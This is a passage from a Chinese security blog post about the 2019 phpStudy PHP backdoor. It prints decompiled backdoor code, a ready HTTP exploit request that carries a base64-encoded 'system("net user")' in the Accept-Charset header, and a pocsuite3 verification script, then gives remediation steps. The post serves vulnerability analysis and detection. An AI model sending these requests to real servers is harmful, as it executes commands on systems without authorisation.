+<h3 id="分析正向连接-RCE"><a href="#分析正向连接-RCE" class="headerlink" title="分析正向连接 RCE"></a>分析正向连接 RCE</h3><p>在C2后门基础上向上接着分析</p>
+<p>核心代码</p>
+<pre><code>if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &amp;v39) != -1
+    &amp;&amp; zend_hash_find(**v39, aHttpAcceptEnco, strlen(aHttpAcceptEnco) + 1, &amp;v34) != -1 )
+  {
+    if ( !strcmp(**v34, aGzipDeflate) )
+    {
+      if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &amp;v39) != -1
+        &amp;&amp; zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &amp;v37) != -1 )
+      {
+        v40 = sub_100040B0(**v37, strlen((const char *)**v37));
+        if ( v40 )
+        {
+          v4 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+          v5 = *(_DWORD *)(v4 + 296);
+          *(_DWORD *)(v4 + 296) = &amp;v30;
+          v35 = v5;
+          v6 = setjmp3(&amp;v30, 0);
+          v7 = v35;
+          if ( v6 )
+            *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;
+          else
+            zend_eval_string(v40, 0, &amp;byte_10012884, a3);
+          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v7;
+        }
+      }
+    }
+
+</code></pre><p>分析代码逻辑</p>
+<p>第一个if()，判断是否存在HTTP_ACCEPT_ENCODING字段，$_SERVER[‘HTTP_ACCEPT_ENCODING’] 为当前请求的 Accept-Encoding: 头部信息的内容。</p>
+<p>第二个if()，在第一个if()基础上，判断$_SERVER[‘HTTP_ACCEPT_ENCODING’] 字段值是否是gzip,deflate。</p>
+<p>第三个if()，在前两个if()的基础上，判断是否存在HTTP_ACCEPT_CHARSET字段 ，$_SERVER[‘HTTP_ACCEPT_CHARSET’]为当前请求的 Accept-Charset: 头部信息的内容。</p>
+<p>最后，在前三个if()的基础上，提取HTTP_ACCEPT_CHARSET字段值，并对该值进行base64解码，然后调用zend_eval_string(v40, 0, &amp;byte_10012884, a3); 执行RCE。</p>
+<p>构造相应Payload：</p>
+<pre><code>GET / HTTP/1.1
+Host: x.x.x.x
+…..
+Accept-Encoding: gzip,deflate
+Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
+….
+
+</code></pre><h2 id="EXP利用"><a href="#EXP利用" class="headerlink" title="EXP利用"></a>EXP利用</h2><h3 id="后门RCE"><a href="#后门RCE" class="headerlink" title="后门RCE"></a>后门RCE</h3><h3 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h3><pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.43.146
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip,deflate
+Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+</code></pre><p>exp利用</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191110100659137-921818580.png" alt="img"></p>
+<p>Accept-Charset请求头字段值需要经过base64编码</p>
+<pre><code>c3lzdGVtKCJuZXQgdXNlciIpOw==
+
+system(&quot;net user&quot;);
+
+</code></pre><p>通过system函数查询的回显，可以看到后门RCE漏洞执行成功</p>
+<p>ps:需要注意的一点，Accept-Encoding: gzip,deflate中，gzip,deflate之间不能存在空格，因为后门程序是进行的严格字符串匹配</p>
+<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><h3 id="后门RCE-1"><a href="#后门RCE-1" class="headerlink" title="后门RCE"></a>后门RCE</h3><p>POC验证</p>
+<p>POC代码编写利用创宇的pocsuite3框架进行编写，此处放上自己最初写的POC，只包含漏洞验证模块，因为本人已删掉attack模块（安全第一！！！）</p>
+<pre><code>import base64
+import hashlib
+import random
+import urllib
+from urllib.parse import urljoin, quote
+from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, get_listener_ip, get_listener_port
+from pocsuite3.api import requests
+from pocsuite3.lib.core.data import logger
+from pocsuite3.lib.utils import get_middle_text
+
+
+class DemoPOC(POCBase):
+    vulID = &#39;&#39;
+    version = &#39;1.0&#39;
+    author = [&#39;Qftm&#39;]
+    vulDate = &#39;2019-09-23&#39;
+    createDate = &#39;2019-09-23&#39;
+    updateDate = &#39;2019-09-23&#39;
+    references = [&#39;&#39;]
+    name = &#39;phpstudy backdoor&#39;
+    appPowerLink = &#39;&#39;
+    appName = &#39;phpstudy&#39;
+    appVersion = &#39;version = 2018|2016&#39;
+    vulType = &#39;backdoor&#39;
+    desc = &#39;&#39;&#39;Phpstudy Backdoor RCE&#39;&#39;&#39;
+    samples = []
+    install_requires = [&#39;&#39;]
+    category = POC_CATEGORY.EXPLOITS.WEBAPP
+
+    def _verify(self):
+        result = {}
+        try:
+            vul_url = urljoin(self.url, &#39;/&#39;)
+            rand_num = random.randint(0, 1000)
+            hash_flag = hashlib.md5(str(rand_num).encode()).hexdigest()
+            print(vul_url)
+            prexp = &#39;&#39;&#39;echo &#39;{}&#39; ;&#39;&#39;&#39;.format(hash_flag)
+            exp = base64.b64encode(prexp.encode()).decode()
+            headers = {&#39;Accept-Encoding&#39;: &#39;gzip,deflate&#39;,
+                       &#39;Accept-Charset&#39;: &#39;{}&#39;.format(exp)
+                       }
+            r = requests.post(vul_url, headers=headers)
+            if r.status_code != 404:
+                if hash_flag in r.text:
+                    print(r.headers.get(&quot;Location&quot;))
+                    result[&#39;VerifyInfo&#39;] = {}
+                    result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url
+        except Exception as ex:
+            logger.exception(ex)
+        return self.parse_output(result)
+
+    def _attack(self):
+        result = {}
+
+        return self.parse_output(result)
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail(&#39;target is not vulnerable&#39;)
+        return output
+
+
+register_poc(DemoPOC)
+
+</code></pre><p>漏洞验证机制使用随机数产生的MD5值（hash_flag）进行校验，首先判断网页是否是404提高命中率，然后根据网页返回来的内容，比对查看是否包含相应的hash_flag，如果包含则证明存在后门RCE，否则不存在。</p>
+<p>验证效果</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191110162329744-319194663.png" alt="img"></p>
+<h2 id="漏洞预防"><a href="#漏洞预防" class="headerlink" title="漏洞预防"></a>漏洞预防</h2><p>1、内部排查确认受影响的Phpstudy环境PC主机，进行安全扫描处理（火绒、360安全卫士等）、清除可能存在的可疑程序。</p>
+<p>2、对受影响的Phpstudy环境PC主机上的用户账号信息做登录日志审计、及时更换相关账号密码，防止账号密码早已泄露，造成危害。</p>
+<p>3、到官网进行下载更新，校验hash。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw
+
+https://www.freebuf.com/articles/others-articles/215406.html#
+
+https://mp.weixin.qq.com/s?__biz=MzI5NjA0NjI5MQ==&amp;mid=2650165920&amp;idx=1&amp;sn=ac45922b6cf1db0f3d3cf0a10872be06&amp;chksm=f448a91cc33f200a32cdbd01535e227a4a81cd3ce843992e410d0e4d5b772914d1ac3d6324fe&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1569082336079&amp;sharer_shareid=050fef71c2c8c2cd7ebc8d5cccf6b556#rd</code></pre><pre><code>文章首发于合天智汇</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Qftm.github.io/2019/11/22/PhpStudyBackDoor2019/">http://Qftm.github.io/2019/11/22/PhpStudyBackDoor2019/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qftm</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/">
+                                    <span class="chip bg-color">木马后门</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2019/12/31/Docker-Learning-Handbook/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/docker-1.png" class="responsive-img" alt="Docker Learning Handbook">
+                        
+                        <span class="card-title">Docker Learning Handbook</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Docker Learning Handbook声明 Author：Qftm
+ Data：2019/12/31
+ Blog：https://qftm.github.io/正文
+Table of Contents
+Docker 简介
+Dock
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" class="post-category">
+                                    安全建设
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Handbook/">
+                        <span class="chip bg-color">Handbook</span>
+                    </a>
+                    
+                    <a href="/tags/Docker/">
+                        <span class="chip bg-color">Docker</span>
+                    </a>
+                    
+                    <a href="/tags/Cloud/">
+                        <span class="chip bg-color">Cloud</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/10/27/Kali-Rolling-2019/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/kali-1.jpg" class="responsive-img" alt="Kali Rolling 2019 系统配置总结（Updateing）">
+                        
+                        <span class="card-title">Kali Rolling 2019 系统配置总结（Updateing）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            主系统Kali Linux确实好用，继《Kali Rolling 2018 系统配置》之后，自己又全面详细的总结了关于Kali Linux系统安装后的配置，《Kali Rolling 2019 系统配置总结（Updateing）》相比《Ka
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Others/" class="post-category">
+                                    Others
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Qftm<br />'
+            + 'Author: Qftm<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">Qftm</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">370.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Qftm" 
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Qftmbin@gmail.com" 
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Qftmer" 
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
